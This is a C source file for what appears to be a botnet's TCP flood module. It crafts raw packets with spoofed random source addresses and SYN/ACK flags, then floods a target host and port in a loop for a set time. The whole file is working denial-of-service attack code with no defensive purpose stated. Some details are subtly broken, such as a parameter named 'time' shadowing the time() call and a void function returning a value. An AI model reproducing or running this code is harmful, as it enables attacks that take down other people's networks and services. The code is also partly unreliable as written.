#ifdef DEBUG
#include <stdio.h>
#endif

#include <time.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <arpa/inet.h>
#include <sys/socket.h>

struct in_addr local;

static uint32_t x, y, z, w;
static uint32_t Q[4096], c = 362436;
enum { SYN, ACK, PSH, RST, FIN, URG };

uint32_t rand_next(void)
{
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y;
    y = z;
    z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}

uint32_t rand_cmwc(void)
{
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (uint32_t)(t >> 32);
    x = t + c;

    if (x < c)
    {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

in_addr_t rand_addr(in_addr_t netmask) {
    in_addr_t tmp = ntohl(local.s_addr) & netmask;
    return tmp ^ ( rand_cmwc() & ~netmask);
}

void makeIPbuffer(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int len)
{
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + len;
    iph->id = rand_cmwc();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0;
    iph->saddr = source;
    iph->daddr = dest;
}

uint32_t local_addr(void)
{
    int fd;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);

    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        return 0;

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("8.8.8.8");
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
    return addr.sin_addr.s_addr;
}

unsigned short csum(unsigned short *buf, int count)
{
    register uint64_t sum = 0;

    while (count > 1)
    {
        sum += *buf++;
        count -= 2;
    }

    if (count > 0)
        sum += *(unsigned char *)buf;

    while (sum >> 16)
        sum = (sum & 0xffff) + (sum >> 16);

    return (uint16_t)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{
    struct tcp_pseudo
    {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;

    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr));

    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    unsigned short *tcp = malloc(totaltcp_len);

    memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr));

    unsigned short output = csum(tcp, totaltcp_len);

    free(tcp);
    return output;
}

uint16_t checksum_generic(uint16_t *addr, uint32_t count)
{
    register unsigned long sum = 0;

    for (sum = 0; count > 1; count -= 2)
        sum += *addr++;

    if (count == 1)
        sum += (char)*addr;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);

    return ~sum;
}

uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;

    while (len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *((uint8_t *)buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t)(~sum));
}

void tcpflood(char *host, int port, int secs, uint8_t flags[], int len)
{
    int fd = -1, end = 0, nmask = ~((in_addr_t) -1);
    struct sockaddr_in addr = {AF_INET, htons(port), .sin_addr.s_addr = inet_addr(host)};

    if (fork() != 0)
        return;

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
        exit(0);

    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &(int){1}, sizeof(int));

    char buffer[sizeof(struct iphdr) + sizeof(struct tcphdr) + len];

    struct iphdr *iph = (struct iphdr *)buffer;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

    makeIPbuffer(iph, addr.sin_addr.s_addr, rand_addr(nmask), IPPROTO_TCP, sizeof(struct tcphdr) + len);

    tcph->source = rand_cmwc();
    tcph->seq = rand_cmwc();
    tcph->ack_seq = 0;
    tcph->doff = 5;

    tcph->syn = flags[0];
    tcph->ack = flags[1];
    tcph->psh = flags[2];
    tcph->rst = flags[3];
    tcph->fin = flags[4];
    tcph->urg = flags[5];

    tcph->window = rand_cmwc();
    tcph->check = 0;
    tcph->urg_ptr = 0;
    tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
    tcph->check = tcpcsum(iph, tcph);

    iph->check = csum((unsigned short *)buffer, iph->tot_len);

    end = time(0) + secs;

    while (1)
    {
        if (time(0) > end)
            break;

        iph->saddr = htonl(rand_addr(nmask));
        iph->id = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->source = rand_cmwc();
        tcph->check = 0;
        tcph->check = tcpcsum(iph, tcph);
        iph->check = csum((unsigned short *)buffer, iph->tot_len);

        sendto(fd, buffer, sizeof(buffer), 0, (struct sockaddr *)&addr, sizeof(addr));
    }
    exit(0);
}

void send_tcp(char *ip, int port, int time)
{
    srand(time(0));

    uint8_t flags[] = {1, 1, 0, 0, 0, 0};

    tcpflood(ip, port, time, flags, 1024);

    while (1)
        sleep(10);
    return 0;
}